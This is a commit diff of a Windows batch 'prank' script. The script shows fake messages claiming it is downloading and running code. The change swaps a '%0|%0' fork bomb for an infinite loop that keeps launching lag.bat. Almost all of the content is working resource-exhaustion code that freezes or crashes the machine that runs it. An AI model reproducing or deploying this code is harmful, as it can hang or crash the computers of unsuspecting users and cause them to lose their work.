deba76af61fbcd448aa96e0c6fd17484c1427330
hailongcoding <156517170+hailongcoding@users.noreply.github.com>
2025-02-08 08:34:43 +0700

    Update prank3.bat

--- ver.3.0 - WARNING/prank3.bat
+++ ver.3.0 - WARNING/prank3.bat
@@ -8,5 +8,8 @@ call :load
     echo downloading code ...
     timeout /t 10 /nobreak > nul 
     echo excuting code ...
-    timeout /t 2 /nobreak > nul 
-    %0|%0
+    timeout /t 2 /nobreak > nul
+
+:loop
+    start lag.bat
+    goto :loop
